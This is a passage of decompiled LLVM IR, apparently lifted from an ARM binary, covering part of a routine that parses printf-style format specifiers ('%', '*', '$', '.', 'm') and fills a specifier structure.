  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_10d38 ], [ %v0_10d0c, %dec_label_pc_10d28 ], [ %v0_10d0c, %bb131 ]
  br label %dec_label_pc_10d74

dec_label_pc_10d44:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_10d44, 1
  br i1 %tmp132, label %dec_label_pc_10d58, label %dec_label_pc_10d4c

dec_label_pc_10d4c:                               ; preds = %dec_label_pc_10d44
  %v7_10d4c = icmp eq i8 %v2_10ce0, 109
  br i1 %v7_10d4c, label %dec_label_pc_10dbc, label %dec_label_pc_11084

dec_label_pc_10d58:                               ; preds = %dec_label_pc_10d44
  %tmp167 = icmp ugt i32 %v0_10d58, %v0_10cf4
  br i1 %tmp167, label %dec_label_pc_10d60, label %dec_label_pc_10d38

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d58
  %v1_10d60 = inttoptr i32 %v0_10cf4 to i8*
  %v2_10d60 = load i8, i8* %v1_10d60, align 1
  %v3_10d60 = zext i8 %v2_10d60 to i32
  store i32 %v3_10d60, i32* %r3.global-to-local, align 4
  %v7_10d64 = icmp eq i8 %v2_10d60, 48
  br i1 %v7_10d64, label %dec_label_pc_10d38, label %bb133

bb133:                                            ; preds = %dec_label_pc_10d60
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10dbc

dec_label_pc_10d74.loopexit:                      ; preds = %dec_label_pc_10d7c
  %v1_10d88 = load i32, i32* @r4, align 4
  %v3_10d88 = or i32 %v1_10d88, %v0_10d9c
  store i32 %v3_10d88, i32* @r4, align 4
  %v2_10d8c = add i32 %storemerge105, 1
  br label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10d74.loopexit, %dec_label_pc_10d3c
  %storemerge105 = phi i32 [ %v0_10d3c, %dec_label_pc_10d3c ], [ %v2_10d8c, %dec_label_pc_10d74.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a0c0.648 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10d80 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_10d7c

dec_label_pc_10d7c:                               ; preds = %dec_label_pc_10d94, %dec_label_pc_10d74
  %v0_10d9c = phi i32 [ %v2_10d9c, %dec_label_pc_10d94 ], [ 1, %dec_label_pc_10d74 ]
  %v0_10d7c = phi i32 [ %v5_10d7c, %dec_label_pc_10d94 ], [ ptrtoint ([8 x i8]* @global_var_1a0c0.648 to i32), %dec_label_pc_10d74 ]
  %v1_10d7c = inttoptr i32 %v0_10d7c to i8*
  %v2_10d7c = load i8, i8* %v1_10d7c, align 1
  %v3_10d7c = zext i8 %v2_10d7c to i32
  store i32 %v3_10d7c, i32* %r2.global-to-local, align 4
  %v5_10d7c = add i32 %v0_10d7c, 1
  store i32 %v5_10d7c, i32* %r1.global-to-local, align 4
  %v2_10d80 = load i8, i8* %v1_10d80, align 1
  %v3_10d80 = zext i8 %v2_10d80 to i32
  store i32 %v3_10d80, i32* %r3.global-to-local, align 4
  %v9_10d84 = icmp eq i8 %v2_10d80, %v2_10d7c
  br i1 %v9_10d84, label %dec_label_pc_10d74.loopexit, label %dec_label_pc_10d94

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10d7c
  %v1_10d94 = inttoptr i32 %v5_10d7c to i8*
  %v2_10d94 = load i8, i8* %v1_10d94, align 1
  %v3_10d94 = zext i8 %v2_10d94 to i32
  store i32 %v3_10d94, i32* %r3.global-to-local, align 4
  %v2_10d98 = icmp eq i8 %v2_10d94, 0
  %v2_10d9c = mul i32 %v0_10d9c, 2
  store i32 %v2_10d9c, i32* %r0.global-to-local, align 4
  br i1 %v2_10d98, label %dec_label_pc_10da4, label %dec_label_pc_10d7c

dec_label_pc_10da4:                               ; preds = %dec_label_pc_10d94
  %v1_10da4 = add i32 %storemerge105, -1
  %v2_10da4 = inttoptr i32 %v1_10da4 to i8*
  %v3_10da4 = load i8, i8* %v2_10da4, align 1
  %v7_10da8 = icmp eq i8 %v3_10da4, 37
  %v0_10dac = load i32, i32* @r4, align 4
  %v1_10dac = and i32 %v0_10dac, 10
  store i32 %v1_10dac, i32* %r3.global-to-local, align 4
  %v4_10db0 = udiv i32 %v1_10dac, 2
  %v5_10db0 = sub nuw nsw i32 -1, %v4_10db0
  %v6_10db0 = and i32 %v0_10dac, %v5_10db0
  store i32 %v6_10db0, i32* @r4, align 4
  br i1 %v7_10da8, label %dec_label_pc_10db8, label %dec_label_pc_10c94

dec_label_pc_10db8:                               ; preds = %dec_label_pc_10da4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10dbc

dec_label_pc_10dbc:                               ; preds = %bb133, %dec_label_pc_10cf4, %dec_label_pc_10d4c, %dec_label_pc_10db8
  %v1_10e00 = phi i32 [ %storemerge105, %dec_label_pc_10db8 ], [ %v0_10d58, %bb133 ], [ %v0_10d58, %dec_label_pc_10d4c ], [ %v0_10d58, %dec_label_pc_10cf4 ]
  %v0_10dfc = phi i32 [ %v5_10d7c, %dec_label_pc_10db8 ], [ %v0_10cf4, %bb133 ], [ %v0_10cf4, %dec_label_pc_10d4c ], [ %v0_10cf4, %dec_label_pc_10cf4 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_10db8 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_10d4c ], [ %stack_var_-48.1, %dec_label_pc_10cf4 ]
  %v1_10dbc = inttoptr i32 %v0_10dfc to i8*
  %v2_10dbc = load i8, i8* %v1_10dbc, align 1
  %v3_10dbc = zext i8 %v2_10dbc to i32
  store i32 %v3_10dbc, i32* %r3.global-to-local, align 4
  %v7_10dc0 = icmp eq i8 %v2_10dbc, 42
  br i1 %v7_10dc0, label %dec_label_pc_10dc8, label %dec_label_pc_10e0c

dec_label_pc_10dc8:                               ; preds = %dec_label_pc_10dbc
  %v0_10dc8 = load i32, i32* %sb.global-to-local, align 4
  %v2_10dc8 = icmp eq i32 %v0_10dc8, 0
  br i1 %v2_10dc8, label %dec_label_pc_10dfc, label %dec_label_pc_10dd0

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10dc8
  %v1_10dd0 = inttoptr i32 %v1_10e00 to i8*
  %v2_10dd0 = load i8, i8* %v1_10dd0, align 1
  %v3_10dd0 = zext i8 %v2_10dd0 to i32
  store i32 %v3_10dd0, i32* %r3.global-to-local, align 4
  %v7_10dd4 = icmp eq i8 %v2_10dd0, 36
  br i1 %v7_10dd4, label %dec_label_pc_10ddc, label %dec_label_pc_11084

dec_label_pc_10ddc:                               ; preds = %dec_label_pc_10dd0
  %v0_10ddc = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_10ddc, 1
  br i1 %tmp134, label %dec_label_pc_11084, label %dec_label_pc_10de4

dec_label_pc_10de4:                               ; preds = %dec_label_pc_10ddc
  store i32 %v25_10bf0, i32* %r1.global-to-local, align 4
  %v0_10dec = load i32, i32* @lr, align 4
  %v3_10dec = mul i32 %v0_10dec, -4
  %v4_10dec = add i32 %v3_10dec, %v25_10bf0
  store i32 %v4_10dec, i32* %r3.global-to-local, align 4
  %v1_10df0 = add i32 %v1_10e00, 1
  store i32 %v1_10df0, i32* %r6.global-to-local, align 4
  %v2_10df4 = add i32 %v4_10dec, -24
  %v3_10df4 = inttoptr i32 %v2_10df4 to i32*
  store i32 %v0_10ddc, i32* %v3_10df4, align 4
  br label %dec_label_pc_10e08

dec_label_pc_10dfc:                               ; preds = %dec_label_pc_10dc8
  %v1_10dfc = add i32 %v0_10dfc, 1
  store i32 %v1_10dfc, i32* %r3.global-to-local, align 4
  %v9_10e00 = icmp eq i32 %v1_10dfc, %v1_10e00
  br i1 %v9_10e00, label %dec_label_pc_10e08, label %dec_label_pc_11084

dec_label_pc_10e08:                               ; preds = %dec_label_pc_10dfc, %dec_label_pc_10de4
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10dbc, %dec_label_pc_10e08
  %v0_10e0c = load i32, i32* @lr, align 4
  %v2_10e0c = icmp eq i32 %v0_10e0c, 0
  br i1 %v2_10e0c, label %dec_label_pc_10e14, label %dec_label_pc_10c2c

dec_label_pc_10e14:                               ; preds = %dec_label_pc_10e0c
  %v0_10e14 = load i32, i32* %r6.global-to-local, align 4
  %v1_10e14 = inttoptr i32 %v0_10e14 to i8*
  %v2_10e14 = load i8, i8* %v1_10e14, align 1
  %v3_10e14 = zext i8 %v2_10e14 to i32
  store i32 %v3_10e14, i32* %r3.global-to-local, align 4
  %v7_10e18 = icmp eq i8 %v2_10e14, 46
  br i1 %v7_10e18, label %.thread22, label %dec_label_pc_10e2c

.thread22:                                        ; preds = %dec_label_pc_10e14
  %v2_10e1c = add i32 %v0_10e14, 1
  store i32 %v2_10e1c, i32* %r6.global-to-local, align 4
  %v1_10e20 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_10e20, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_10c94

dec_label_pc_10e2c:                               ; preds = %dec_label_pc_10e14
  %v0_10e2c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10e2c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10e34

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10c2c, %dec_label_pc_10e2c
  %v0_10e3c.pre = phi i32 [ %v0_10e14, %dec_label_pc_10e2c ], [ %v0_10e3c.pre.pre, %dec_label_pc_10c2c ]
  %storemerge = phi i32 [ -1, %dec_label_pc_10e2c ], [ %v0_10c2c, %dec_label_pc_10c2c ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a068.650 to i32), i32* %r1.global-to-local, align 4
  %v1_10e3c = inttoptr i32 %v0_10e3c.pre to i8*
  br label %dec_label_pc_10e38

dec_label_pc_10e38:                               ; preds = %dec_label_pc_10e48, %dec_label_pc_10e34
  %v0_10e48 = phi i32 [ %v1_10e48, %dec_label_pc_10e48 ], [ ptrtoint ([9 x i8]* @global_var_1a068.650 to i32), %dec_label_pc_10e34 ]
  %v1_10e38 = inttoptr i32 %v0_10e48 to i8*
  %v2_10e38 = load i8, i8* %v1_10e38, align 1
  %v3_10e38 = zext i8 %v2_10e38 to i32
  store i32 %v3_10e38, i32* %r2.global-to-local, align 4
  %v2_10e3c = load i8, i8* %v1_10e3c, align 1
  %v3_10e3c = zext i8 %v2_10e3c to i32
  store i32 %v3_10e3c, i32* %r3.global-to-local, align 4
  %v9_10e40 = icmp eq i8 %v2_10e3c, %v2_10e38
  br i1 %v9_10e40, label %dec_label_pc_10c34, label %dec_label_pc_10e48

dec_label_pc_10e48:                               ; preds = %dec_label_pc_10e38
  %v1_10e48 = add i32 %v0_10e48, 1
  %v2_10e48 = inttoptr i32 %v1_10e48 to i8*
  %v3_10e48 = load i8, i8* %v2_10e48, align 1
  %v4_10e48 = zext i8 %v3_10e48 to i32
  store i32 %v4_10e48, i32* %r3.global-to-local, align 4
  store i32 %v1_10e48, i32* %r1.global-to-local, align 4
  %v2_10e4c = icmp eq i8 %v3_10e48, 0
  br i1 %v2_10e4c, label %dec_label_pc_10e54, label %dec_label_pc_10e38

dec_label_pc_10e54:                               ; preds = %dec_label_pc_10e48, %dec_label_pc_10c34
  %v1_10e74 = phi i32 [ %v1_10c34, %dec_label_pc_10c34 ], [ %v0_10e3c.pre, %dec_label_pc_10e48 ]
  %v1_10e70 = phi i32 [ %v0_10e48, %dec_label_pc_10c34 ], [ %v1_10e48, %dec_label_pc_10e48 ]
  %v2_10e58 = sub i32 %v1_10e70, ptrtoint ([9 x i8]* @global_var_1a068.650 to i32)
  store i32 %v2_10e58, i32* %r3.global-to-local, align 4
  %v8_10e60 = icmp sgt i32 %v2_10e58, 1
  br i1 %v8_10e60, label %.thread25, label %dec_label_pc_10e64

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e54
  %v1_10e64 = inttoptr i32 %v1_10e74 to i8*
  %v2_10e64 = load i8, i8* %v1_10e64, align 1
  %v3_10e64 = zext i8 %v2_10e64 to i32
  store i32 %v3_10e64, i32* %r2.global-to-local, align 4
  %v1_10e68 = inttoptr i32 %v1_10e70 to i8*
  %v2_10e68 = load i8, i8* %v1_10e68, align 1
  %v3_10e68 = zext i8 %v2_10e68 to i32
  store i32 %v3_10e68, i32* %r3.global-to-local, align 4
  %v9_10e6c = icmp eq i8 %v2_10e64, %v2_10e68
  br i1 %v9_10e6c, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_10e64
  %v2_10e70 = add i32 %v1_10e70, 9
  store i32 %v2_10e70, i32* %r1.global-to-local, align 4
  %v2_10e74 = add i32 %v1_10e74, 1
  store i32 %v2_10e74, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_10e64, %dec_label_pc_10e54, %bb135
  %v0_10e7c = phi i32 [ %v1_10e70, %dec_label_pc_10e64 ], [ %v1_10e70, %dec_label_pc_10e54 ], [ %v2_10e70, %bb135 ]
  %v0_10e78 = phi i32 [ %v1_10e74, %dec_label_pc_10e64 ], [ %v1_10e74, %dec_label_pc_10e54 ], [ %v2_10e74, %bb135 ]
  %v1_10e78 = inttoptr i32 %v0_10e78 to i8*
  %v2_10e78 = load i8, i8* %v1_10e78, align 1
  %v3_10e78 = zext i8 %v2_10e78 to i32
  store i32 %v3_10e78, i32* %r2.global-to-local, align 4
  %v1_10e7c = add i32 %v0_10e7c, 9
  %v2_10e7c = inttoptr i32 %v1_10e7c to i8*
  %v3_10e7c = load i8, i8* %v2_10e7c, align 1
  %v4_10e7c = zext i8 %v3_10e7c to i32
  store i32 %v4_10e7c, i32* %r3.global-to-local, align 4
  %v2_10e80 = icmp eq i8 %v2_10e78, 0
  %v3_10e84 = mul nuw nsw i32 %v4_10e7c, 256
  store i32 %v3_10e84, i32* @lr, align 4
  br i1 %v2_10e80, label %dec_label_pc_11084, label %dec_label_pc_10e8c

dec_label_pc_10e8c:                               ; preds = %.thread25
  %v3_10e90 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_10e90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e94

dec_label_pc_10e94:                               ; preds = %dec_label_pc_10f18, %dec_label_pc_10e8c
  %v1_10ea4 = phi i32 [ %v1_10f18, %dec_label_pc_10f18 ], [ ptrtoint ([21 x i8]* @global_var_1a0a8.652 to i32), %dec_label_pc_10e8c ]
  %v1_10e94 = inttoptr i32 %v1_10ea4 to i8*
  %v2_10e94 = load i8, i8* %v1_10e94, align 1
  %v3_10e94 = zext i8 %v2_10e94 to i32
  store i32 %v3_10e94, i32* %r3.global-to-local, align 4
  %v9_10e98 = icmp eq i8 %v2_10e94, %v2_10e78
  br i1 %v9_10e98, label %dec_label_pc_10ea0, label %dec_label_pc_10f18

dec_label_pc_10ea0:                               ; preds = %dec_label_pc_10e94
  store i32 ptrtoint ([21 x i8]* @global_var_1a0a8.652 to i32), i32* %r3.global-to-local, align 4
  %v2_10ea4 = sub i32 %v1_10ea4, ptrtoint ([21 x i8]* @global_var_1a0a8.652 to i32)
  store i32 %v2_10ea4, i32* %r2.global-to-local, align 4
  %v7_10eac = icmp slt i32 %v2_10ea4, 18
  br i1 %v7_10eac, label %bb137, label %dec_label_pc_10eb0

dec_label_pc_10eb0:                               ; preds = %dec_label_pc_10ea0
  %v1_10eb0 = and i32 %v3_10e84, 1024
  %v2_10eb0 = icmp eq i32 %v1_10eb0, 0
  br i1 %v2_10eb0, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_10eb0
  %v2_10eb4 = add i32 %v2_10ea4, -2
  store i32 %v2_10eb4, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_10ea0, %dec_label_pc_10eb0, %bb136
  %v0_10eb8 = phi i32 [ %v2_10ea4, %dec_label_pc_10ea0 ], [ %v2_10ea4, %dec_label_pc_10eb0 ], [ %v2_10eb4, %bb136 ]
  %v1_10eb8 = load i32, i32* %r7.global-to-local, align 4
  %v2_10eb8 = add i32 %v1_10eb8, 32
  %v3_10eb8 = inttoptr i32 %v2_10eb8 to i32*
  store i32 %v0_10eb8, i32* %v3_10eb8, align 4
  store i32 ptrtoint (i32* @global_var_1a09b.654 to i32), i32* %r1.global-to-local, align 4
  %v0_10ec4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ec0

dec_label_pc_10ec0:                               ; preds = %dec_label_pc_10ec0, %bb137
  %v0_10ec0 = phi i32 [ %v1_10ec0, %dec_label_pc_10ec0 ], [ ptrtoint (i32* @global_var_1a09b.654 to i32), %bb137 ]
  %v1_10ec0 = add i32 %v0_10ec0, 1
  %v2_10ec0 = inttoptr i32 %v1_10ec0 to i8*
  %v3_10ec0 = load i8, i8* %v2_10ec0, align 1
  %v4_10ec0 = zext i8 %v3_10ec0 to i32
  store i32 %v4_10ec0, i32* %r3.global-to-local, align 4
  store i32 %v1_10ec0, i32* %r1.global-to-local, align 4
  %v8_10ec8 = icmp sgt i32 %v0_10ec4.pre, %v4_10ec0
  br i1 %v8_10ec8, label %dec_label_pc_10ec0, label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10ec0
  store i32 ptrtoint (i32* @global_var_1a08c.658 to i32), i32* %r0.global-to-local, align 4
  %v2_10ed4 = sub i32 %v1_10ec0, ptrtoint (i32* @global_var_1a09c.656 to i32)
  %v2_10ed8 = mul i32 %v2_10ed4, 2
  store i32 %v2_10ed8, i32* %r3.global-to-local, align 4
  %v2_10ee0 = add i32 %v2_10ed8, ptrtoint (i32* @global_var_1a08c.658 to i32)
  store i32 %v2_10ee0, i32* %r2.global-to-local, align 4
  %v1_10ee4 = add i32 %v2_10ed8, add (i32 ptrtoint (i32* @global_var_1a08c.658 to i32), i32 1)
  %v2_10ee4 = inttoptr i32 %v1_10ee4 to i8*
  %v3_10ee4 = load i8, i8* %v2_10ee4, align 1
  %v4_10ee4 = zext i8 %v3_10ee4 to i32
  store i32 %v4_10ee4, i32* %r1.global-to-local, align 4
  %v2_10ee8 = add i32 %v2_10ed8, ptrtoint (i32* @global_var_1a07c.660 to i32)
  store i32 %v2_10ee8, i32* %r2.global-to-local, align 4
  %v3_10eec = inttoptr i32 %v2_10ee0 to i8*
  %v4_10eec = load i8, i8* %v3_10eec, align 2
  %v6_10eec = zext i8 %v4_10eec to i32
  store i32 %v6_10eec, i32* %r0.global-to-local, align 4
  %v1_10ef0 = add i32 %v2_10ed8, add (i32 ptrtoint (i32* @global_var_1a07c.660 to i32), i32 1)
  %v2_10ef0 = inttoptr i32 %v1_10ef0 to i8*
  %v3_10ef0 = load i8, i8* %v2_10ef0, align 1
  %v4_10ef0 = zext i8 %v3_10ef0 to i32
  store i32 %v4_10ef0, i32* %r2.global-to-local, align 4
  %v3_10ef4 = inttoptr i32 %v2_10ee8 to i8*
  %v4_10ef4 = load i8, i8* %v3_10ef4, align 2
  %v6_10ef4 = zext i8 %v4_10ef4 to i32
  %v3_10ef8 = mul nuw i32 %v4_10ee4, 16777216
  store i32 %v3_10ef8, i32* %r1.global-to-local, align 4
  %v4_10efc = sdiv i32 %v3_10ef8, 65536
  %v5_10efc = or i32 %v6_10eec, %v4_10efc
  %v3_10f00 = mul nuw i32 %v4_10ef0, 16777216
  store i32 %v3_10f00, i32* %r2.global-to-local, align 4
  %v4_10f04 = sdiv i32 %v3_10f00, 65536
  %v5_10f04 = or i32 %v6_10ef4, %v4_10f04
  store i32 %v5_10f04, i32* %r3.global-to-local, align 4
  %v0_10f08 = load i32, i32* @lr, align 4
  %v2_10f08 = or i32 %v5_10efc, %v0_10f08
  store i32 ptrtoint ([21 x i8]* @global_var_1a0a8.652 to i32), i32* @ip, align 4
  %v2_10f10 = and i32 %v2_10f08, %v5_10f04
  store i32 %v2_10f10, i32* %r0.global-to-local, align 4
  %v0_10f2c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10f24

dec_label_pc_10f18:                               ; preds = %dec_label_pc_10e94
  %v1_10f18 = add i32 %v1_10ea4, 1
  %v2_10f18 = inttoptr i32 %v1_10f18 to i8*
  %v3_10f18 = load i8, i8* %v2_10f18, align 1
  %v4_10f18 = zext i8 %v3_10f18 to i32
  store i32 %v4_10f18, i32* %r3.global-to-local, align 4
  store i32 %v1_10f18, i32* @ip, align 4
  %v2_10f1c = icmp eq i8 %v3_10f18, 0
  br i1 %v2_10f1c, label %dec_label_pc_10f24, label %dec_label_pc_10e94

dec_label_pc_10f24:                               ; preds = %dec_label_pc_10f18, %dec_label_pc_10ecc
  %v0_10f30 = phi i32 [ %v0_10f08, %dec_label_pc_10ecc ], [ %v3_10e84, %dec_label_pc_10f18 ]
  %v0_10f2c = phi i32 [ %v0_10f2c.pre, %dec_label_pc_10ecc ], [ %v0_10e78, %dec_label_pc_10f18 ]
  %v0_10f24 = phi i32 [ %v2_10f10, %dec_label_pc_10ecc ], [ %v3_10e90, %dec_label_pc_10f18 ]
  store i32 %v0_10f24, i32* %stack_var_-36, align 4
  %v0_10f28 = load i32, i32* @r4, align 4
  %v1_10f28 = and i32 %v0_10f28, 4
  %v1_10f2c = inttoptr i32 %v0_10f2c to i8*
  %v2_10f2c = load i8, i8* %v1_10f2c, align 1
  %v3_10f2c = zext i8 %v2_10f2c to i32
  store i32 %v3_10f2c, i32* %r1.global-to-local, align 4
  %v1_10f30 = and i32 %v0_10f30, 3840
  %v1_10f34 = and i32 %v0_10f28, -5
  %v2_10f38 = or i32 %v1_10f34, %v1_10f30
  store i32 %v2_10f38, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_10f28, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_10f48 = load i32, i32* %r7.global-to-local, align 4
  %v2_10f48 = add i32 %v1_10f48, 12
  %v3_10f48 = inttoptr i32 %v2_10f48 to i32*
  store i32 %v3_10f2c, i32* %v3_10f48, align 4
  %v0_10f4c = load i32, i32* %r7.global-to-local, align 4
  %v1_10f4c = add i32 %v0_10f4c, 4
  %v2_10f4c = inttoptr i32 %v1_10f4c to i32*
  %v3_10f4c = load i32, i32* @r5, align 4
  store i32 %v3_10f4c, i32* %v2_10f4c, align 4
  %v4_10f4c = add i32 %v0_10f4c, 8
  %v5_10f4c = inttoptr i32 %v4_10f4c to i32*
  %v6_10f4c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_10f4c, i32* %v5_10f4c, align 4
  %v0_10f50 = load i32, i32* %r3.global-to-local, align 4
  %v1_10f50 = load i32, i32* %r7.global-to-local, align 4
  %v2_10f50 = add i32 %v1_10f50, 20
  %v3_10f50 = inttoptr i32 %v2_10f50 to i32*
  store i32 %v0_10f50, i32* %v3_10f50, align 4
  %v0_10f54 = load i32, i32* %r2.global-to-local, align 4
  %v1_10f54 = load i32, i32* %r7.global-to-local, align 4
  %v2_10f54 = add i32 %v1_10f54, 16
  %v3_10f54 = inttoptr i32 %v2_10f54 to i32*
  store i32 %v0_10f54, i32* %v3_10f54, align 4
  %v0_10f58 = load i32, i32* %r0.global-to-local, align 4
  %v1_10f58 = load i32, i32* %r7.global-to-local, align 4
  %v2_10f58 = add i32 %v1_10f58, 28
  %v3_10f58 = inttoptr i32 %v2_10f58 to i32*
  store i32 %v0_10f58, i32* %v3_10f58, align 4
  %v0_10f5c = load i32, i32* @ip, align 4
  %v1_10f5c = inttoptr i32 %v0_10f5c to i8*
  %v2_10f5c = load i8, i8* %v1_10f5c, align 1
  %v3_10f5c = zext i8 %v2_10f5c to i32
  store i32 %v3_10f5c, i32* %r2.global-to-local, align 4
  %v2_10f60 = icmp eq i8 %v2_10f5c, 0
  br i1 %v2_10f60, label %dec_label_pc_10f68, label %dec_label_pc_10f80

dec_label_pc_10f68:                               ; preds = %dec_label_pc_10f24
  %v0_10f68 = load i32, i32* %r6.global-to-local, align 4
  %v1_10f68 = inttoptr i32 %v0_10f68 to i8*
  %v2_10f68 = load i8, i8* %v1_10f68, align 1
  %v3_10f68 = zext i8 %v2_10f68 to i32
  store i32 %v3_10f68, i32* %r3.global-to-local, align 4
  %v7_10f6c = icmp eq i8 %v2_10f68, 109
  br i1 %v7_10f6c, label %dec_label_pc_10f74, label %dec_label_pc_11084

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f68
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_10f78 = load i32, i32* %r7.global-to-local, align 4
  %v2_10f78 = add i32 %v1_10f78, 32
  %v3_10f78 = inttoptr i32 %v2_10f78 to i32*
  store i32 20, i32* %v3_10f78, align 4
  %v0_10f7c = load i32, i32* %r2.global-to-local, align 4
  %v1_10f7c = load i32, i32* %r7.global-to-local, align 4
  %v2_10f7c = add i32 %v1_10f7c, 28
  %v3_10f7c = inttoptr i32 %v2_10f7c to i32*
  store i32 %v0_10f7c, i32* %v3_10f7c, align 4
  br label %dec_label_pc_10f80

dec_label_pc_10f80:                               ; preds = %dec_label_pc_10f24, %dec_label_pc_10f74
  %v0_10f80 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_10f80, 1
  br i1 %tmp141, label %dec_label_pc_11038, label %dec_label_pc_10f88

dec_label_pc_10f88:                               ; preds = %dec_label_pc_10f80
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10f8c

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_11020, %dec_label_pc_10f88
  %v8_10fa8 = phi i32 [ 0, %dec_label_pc_10f88 ], [ %v1_11024, %dec_label_pc_11020 ]
  %v7_10f90 = icmp sgt i32 %v8_10fa8, 2
  br i1 %v7_10f90, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_10f8c
  store i32 %v25_10bf0, i32* %r2.global-to-local, align 4
  %v12_10f94 = mul i32 %v8_10fa8, 4
  %v13_10f94 = add i32 %v12_10f94, %v25_10bf0
  store i32 %v13_10f94, i32* %r3.global-to-local, align 4
  %v9_10f98 = add i32 %v13_10f94, -24
  %v10_10f98 = inttoptr i32 %v9_10f98 to i32*
  %v11_10f98 = load i32, i32* %v10_10f98, align 4
  store i32 %v11_10f98, i32* %r2.global-to-local, align 4
  %v9_10f9c = load i32, i32* %r7.global-to-local, align 4
  %v10_10f9c = add i32 %v9_10f9c, %v8_10fa8
  store i32 %v10_10f9c, i32* %r3.global-to-local, align 4
  %v9_10fa4 = trunc i32 %v11_10f98 to i8
  %v11_10fa4 = add i32 %v10_10f9c, 36
  %v12_10fa4 = inttoptr i32 %v11_10fa4 to i8*
  store i8 %v9_10fa4, i8* %v12_10fa4, align 1
  %v8_10fac = load i32, i32* %r3.global-to-local, align 4
  %v9_10fac = add i32 %v8_10fac, 36
  %v10_10fac = inttoptr i32 %v9_10fac to i8*
  %v11_10fac = load i8, i8* %v10_10fac, align 1
  %v12_10fac = zext i8 %v11_10fac to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_10f8c
  %v10_10fa8 = add i32 %v8_10fa8, %stack_var_-48.3
  store i32 %v10_10fa8, i32* %r3.global-to-local, align 4
  %v9_10fb0 = add i32 %v10_10fa8, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_10fd4 = phi i32 [ %v12_10fac, %bb142 ], [ %v9_10fb0, %bb143 ]
  store i32 %v0_10fd4, i32* @r2, align 4
  %v1_10fb4 = load i32, i32* %sb.global-to-local, align 4
  %v2_10fb4 = sub i32 %v0_10fd4, %v1_10fb4
  %v4_10fb4 = xor i32 %v1_10fb4, %v0_10fd4
  %v5_10fb4 = xor i32 %v2_10fb4, %v0_10fd4
  %v6_10fb4 = and i32 %v5_10fb4, %v4_10fb4
  %v7_10fb4 = icmp slt i32 %v6_10fb4, 0
  %v8_10fb4 = icmp slt i32 %v2_10fb4, 0
  %v9_10fb4 = icmp eq i32 %v0_10fd4, %v1_10fb4
  %v3_10fb8 = xor i1 %v8_10fb4, %v7_10fb4
  %v4_10fb8 = or i1 %v9_10fb4, %v3_10fb8
  br i1 %v4_10fb8, label %dec_label_pc_10fc8, label %dec_label_pc_10fbc

dec_label_pc_10fbc:                               ; preds = %bb144
  %v1_10fbc = add i32 %v0_10fd4, -9
  %v3_10fbc = sub i32 8, %v0_10fd4
  %v4_10fbc = and i32 %v3_10fbc, %v0_10fd4
  %v5_10fbc = icmp slt i32 %v4_10fbc, 0
  %v6_10fbc = icmp slt i32 %v1_10fbc, 0
  %v7_10fbc = icmp eq i32 %v0_10fd4, 9
  %v3_10fc0 = xor i1 %v6_10fbc, %v5_10fbc
  %v4_10fc0 = or i1 %v7_10fbc, %v3_10fc0
  br i1 %v4_10fc0, label %dec_label_pc_10fc4, label %dec_label_pc_11084

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10fbc
  store i32 %v0_10fd4, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10fc8

dec_label_pc_10fc8:                               ; preds = %bb144, %dec_label_pc_10fc4
  store i32 %v25_10bf0, i32* @ip, align 4
  %v1_10fcc = load i32, i32* %r8.global-to-local, align 4
  %v4_10fcc = mul i32 %v1_10fcc, 4
  %v5_10fcc = add i32 %v4_10fcc, %v25_10bf0
  store i32 %v5_10fcc, i32* %r3.global-to-local, align 4
  %v1_10fd0 = add i32 %v5_10fcc, -12
  %v2_10fd0 = inttoptr i32 %v1_10fd0 to i32*
